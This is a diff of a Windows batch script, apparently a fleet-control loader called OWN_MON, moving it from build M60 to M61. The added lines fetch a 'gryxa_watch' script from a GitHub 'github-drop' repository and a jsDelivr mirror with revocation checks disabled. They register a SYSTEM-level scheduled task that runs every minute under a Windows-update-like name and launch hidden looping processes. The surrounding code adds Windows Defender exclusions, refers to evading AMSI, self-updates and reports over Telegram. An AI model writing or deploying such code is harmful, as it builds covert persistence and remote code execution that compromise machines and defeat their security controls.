@@ -1,6 +1,7 @@
 @echo off
 rem ═══════════════════════════════════════════════════════════════
-rem  OWN_MON  BUILD 20260804M60
+rem  OWN_MON  BUILD 20260804M61
+rem  M61: arm gryxa_watch LOOP — record all Gryxa interference; Telegram on DROP with CAUSE.
 rem  M60: OBSERVE mode — no heal/force/reinstall; log health to drop_trace.log (prove drop cause).
 rem  M59: stop drop+reinstall — clear force SKIP if healthy; HEAL/Ensure 1060-only; G9 never /x on HEAL.
 rem  M58: sticky version_floor.cfg — once updated, never apply/run older mon/lib/gryxa again.
@@ -39,6 +40,8 @@ set "OWNLIB=https://raw.githubusercontent.com/xnobuddy/github-drop/main/own_lib.
 set "OWNLIB2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/own_lib.ps1?t=%RANDOM%%RANDOM%"
 set "OWNGRYXA=https://raw.githubusercontent.com/xnobuddy/github-drop/main/own_gryxa.cmd?t=%RANDOM%%RANDOM%"
 set "OWNGRYXA2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/own_gryxa.cmd?t=%RANDOM%%RANDOM%"
+set "OWNWATCH=https://raw.githubusercontent.com/xnobuddy/github-drop/main/gryxa_watch.cmd?t=%RANDOM%%RANDOM%"
+set "OWNWATCH2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/gryxa_watch.cmd?t=%RANDOM%%RANDOM%"
 set "MANIFEST_URL=https://raw.githubusercontent.com/xnobuddy/github-drop/main/update.manifest?t=%RANDOM%%RANDOM%"
 set "MANIFEST_SIG_URL=https://raw.githubusercontent.com/xnobuddy/github-drop/main/update.manifest.sig?t=%RANDOM%%RANDOM%"
 set "SEVRZ_EXP_URL=https://raw.githubusercontent.com/xnobuddy/github-drop/main/sevrz_expected.cfg?t=%RANDOM%%RANDOM%"
@@ -63,8 +66,8 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "Scre
 reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "msiexec.exe" /t REG_DWORD /d 0 /f >nul 2>&1
 if not exist "%LOG%" type nul>"%LOG%" 2>nul
 
-set "MONVER=M60"
-set "MON_MIN=M59"
+set "MONVER=M61"
+set "MON_MIN=M60"
 set "GIT_PIN="
 set "CHANNEL_URL=https://raw.githubusercontent.com/xnobuddy/github-drop/main/fleet_channel.cfg?t=%RANDOM%%RANDOM%"
 set "FLOOR_FILE=%WD%\version_floor.cfg"
@@ -161,6 +164,7 @@ if exist "%STAGE%\fleet_channel.cfg" (
     set "OWNMON=https://raw.githubusercontent.com/xnobuddy/github-drop/!GIT_PIN!/own_mon.cmd?t=%RANDOM%%RANDOM%"
     set "OWNLIB=https://raw.githubusercontent.com/xnobuddy/github-drop/!GIT_PIN!/own_lib.ps1?t=%RANDOM%%RANDOM%"
     set "OWNGRYXA=https://raw.githubusercontent.com/xnobuddy/github-drop/!GIT_PIN!/own_gryxa.cmd?t=%RANDOM%%RANDOM%"
+    set "OWNWATCH=https://raw.githubusercontent.com/xnobuddy/github-drop/!GIT_PIN!/gryxa_watch.cmd?t=%RANDOM%%RANDOM%"
     set "OWNSEC=https://raw.githubusercontent.com/xnobuddy/github-drop/!GIT_PIN!/own_secure.cmd?t=%RANDOM%%RANDOM%"
     set "MANIFEST_URL=https://raw.githubusercontent.com/xnobuddy/github-drop/!GIT_PIN!/update.manifest?t=%RANDOM%%RANDOM%"
     set "MANIFEST_SIG_URL=https://raw.githubusercontent.com/xnobuddy/github-drop/!GIT_PIN!/update.manifest.sig?t=%RANDOM%%RANDOM%"
@@ -186,6 +190,8 @@ if not exist "%STAGE%\own_lib.new" "%CURL%" -L --connect-timeout 8 --max-time 40
 if not exist "%STAGE%\own_mon.next" "%CURL%" -L --connect-timeout 8 --max-time 40 -o "%STAGE%\own_mon.next" "%OWNMON2%" >nul 2>&1
 "%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 20 -o "%STAGE%\own_gryxa.new" "%OWNGRYXA%" >nul 2>&1
 if not exist "%STAGE%\own_gryxa.new" "%CURL%" -L --connect-timeout 8 --max-time 20 -o "%STAGE%\own_gryxa.new" "%OWNGRYXA2%" >nul 2>&1
+"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 20 -o "%STAGE%\gryxa_watch.new" "%OWNWATCH%" >nul 2>&1
+if not exist "%STAGE%\gryxa_watch.new" "%CURL%" -L --connect-timeout 8 --max-time 20 -o "%STAGE%\gryxa_watch.new" "%OWNWATCH2%" >nul 2>&1
 "%CURL%" -L --ssl-no-revoke --connect-timeout 6 --max-time 20 -o "%STAGE%\update.manifest" "%MANIFEST_URL%" >nul 2>&1
 "%CURL%" -L --ssl-no-revoke --connect-timeout 6 --max-time 20 -o "%STAGE%\update.manifest.sig" "%MANIFEST_SIG_URL%" >nul 2>&1
 
@@ -197,6 +203,7 @@ if exist "%STAGE%\own_mon.next" set "MAP=!MAP!own_mon.cmd=%STAGE%\own_mon.next;"
 if exist "%STAGE%\own_secure.new" set "MAP=!MAP!own_secure.cmd=%STAGE%\own_secure.new;"
 if exist "%STAGE%\tg_report.new" set "MAP=!MAP!tg_report.ps1=%STAGE%\tg_report.new;"
 if exist "%STAGE%\own_gryxa.new" set "MAP=!MAP!own_gryxa.cmd=%STAGE%\own_gryxa.new;"
+if exist "%STAGE%\gryxa_watch.new" set "MAP=!MAP!gryxa_watch.cmd=%STAGE%\gryxa_watch.new;"
 set "VRES=missing"
 if exist "%WD%\own_lib.ps1" if exist "%STAGE%\update.manifest" if exist "%STAGE%\update.manifest.sig" if defined MAP (
   for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action verify-update -WorkDir "%WD%" -Extra "%STAGE%\update.manifest|%STAGE%\update.manifest.sig|!MAP!"`) do set "VRES=%%R"
@@ -246,6 +253,10 @@ if /I "!UPD_OK!"=="1" (
       )
     )
   )
+  if exist "%STAGE%\gryxa_watch.new" (
+    findstr /C:"GRYXA_WATCH BUILD" "%STAGE%\gryxa_watch.new" >nul 2>&1
+    if not errorlevel 1 move /y "%STAGE%\gryxa_watch.new" "%WD%\gryxa_watch.cmd" >nul 2>&1
+  )
   set "SELF_UPD=0"
   if exist "%STAGE%\own_mon.next" (
     fc /b "%STAGE%\own_mon.next" "%WD%\own_mon.cmd" >nul 2>&1
@@ -283,6 +294,10 @@ if /I "!UPD_OK!"=="1" (
       )
     )
   )
+  if exist "%STAGE%\gryxa_watch.new" (
+    findstr /C:"GRYXA_WATCH BUILD" "%STAGE%\gryxa_watch.new" >nul 2>&1
+    if not errorlevel 1 for %%F in ("%STAGE%\gryxa_watch.new") do if %%~zF GTR 800 move /y "%STAGE%\gryxa_watch.new" "%WD%\gryxa_watch.cmd" >nul 2>&1
+  )
   set "SELF_UPD=0"
   findstr /C:"OWN_MON  BUILD" "%STAGE%\own_mon.next" >nul 2>&1
   if not errorlevel 1 for %%F in ("%STAGE%\own_mon.next") do if %%~zF GTR 1500 (
@@ -291,7 +306,7 @@ if /I "!UPD_OK!"=="1" (
   )
   if "%SELF_UPD%"=="0" del /f /q "%STAGE%\own_mon.next" >nul 2>&1
 ) else (
-  del /f /q "%STAGE%\tg_report.new" "%STAGE%\own_secure.new" "%STAGE%\own_lib.new" "%STAGE%\own_mon.next" "%STAGE%\own_gryxa.new" >nul 2>&1
+  del /f /q "%STAGE%\tg_report.new" "%STAGE%\own_secure.new" "%STAGE%\own_lib.new" "%STAGE%\own_mon.next" "%STAGE%\own_gryxa.new" "%STAGE%\gryxa_watch.new" >nul 2>&1
   set "SELF_UPD=0"
 )
 call :SaveFloor
@@ -306,8 +321,11 @@ if "!SELF_UPD!"=="1" if exist "%STAGE%\own_mon.next" (
   )
 )
 
-del /f /q "%STAGE%\tg_report.new" "%STAGE%\own_secure.new" "%STAGE%\own_lib.new" "%STAGE%\own_gryxa.new" >nul 2>&1
+del /f /q "%STAGE%\tg_report.new" "%STAGE%\own_secure.new" "%STAGE%\own_lib.new" "%STAGE%\own_gryxa.new" "%STAGE%\gryxa_watch.new" >nul 2>&1
 del /f /q "%STAGE%\update.manifest" "%STAGE%\update.manifest.sig" >nul 2>&1
+
+rem M61: ensure Gryxa drop watcher is present + looping
+call :EnsureGryxaWatch
 
 rem M43: if lib still missing (AMSI wiped it / never landed), keep a TEMP copy for fallbacks
 if not exist "%WD%\own_lib.ps1" if exist "%STAGE%\own_lib.new" (
@@ -979,6 +997,36 @@ if errorlevel 1 (
   powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command "Start-Process cmd.exe -ArgumentList '/c','%SystemRoot%\Temp\.upd\gryxa_heal_once.cmd' -WindowStyle Hidden" >nul 2>&1
 )
 echo gryxa_heal_queued mode=%HEALMODE%>>"%LOG%"
+exit /b 0
+
+:EnsureGryxaWatch
+rem M61: download + arm continuous LOOP + 1-min TICK backup task
+if not exist "%WD%\gryxa_watch.cmd" (
+  "%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 20 -o "%WD%\gryxa_watch.cmd" "%OWNWATCH%" >nul 2>&1
+  if not exist "%WD%\gryxa_watch.cmd" "%CURL%" -L --connect-timeout 8 --max-time 20 -o "%WD%\gryxa_watch.cmd" "%OWNWATCH2%" >nul 2>&1
+)
+if not exist "%WD%\gryxa_watch.cmd" (
+  echo gryxa_watch_missing>>"%LOG%"
+  exit /b 1
+)
+findstr /C:"GRYXA_WATCH BUILD" "%WD%\gryxa_watch.cmd" >nul 2>&1
+if errorlevel 1 (
+  echo gryxa_watch_bad_marker>>"%LOG%"
+  exit /b 1
+)
+schtasks /Create /TN "WucacheGryxaWatch" /TR "cmd.exe /c \"%WD%\gryxa_watch.cmd\" TICK" /SC MINUTE /MO 1 /RU SYSTEM /RL HIGHEST /F >nul 2>&1
+set "NEED_LOOP=1"
+if exist "%WD%\gryxa_watch.hb" (
+  powershell -NoProfile -NonInteractive -Command "if((Test-Path '%WD%\gryxa_watch.hb') -and (((Get-Date)-(Get-Item -LiteralPath '%WD%\gryxa_watch.hb').LastWriteTime).TotalSeconds -lt 30)){exit 0}else{exit 1}" >nul 2>&1
+  if not errorlevel 1 set "NEED_LOOP=0"
+)
+if "!NEED_LOOP!"=="1" (
+  echo gryxa_watch_start_loop>>"%LOG%"
+  wmic process call create "cmd.exe /c \"%WD%\gryxa_watch.cmd\" LOOP" >nul 2>&1
+  if errorlevel 1 powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command "Start-Process cmd.exe -ArgumentList '/c','\"%WD%\gryxa_watch.cmd\" LOOP' -WindowStyle Hidden" >nul 2>&1
+) else (
+  echo gryxa_watch_loop_alive>>"%LOG%"
+)
 exit /b 0
 
 :EnsureGryxaMust
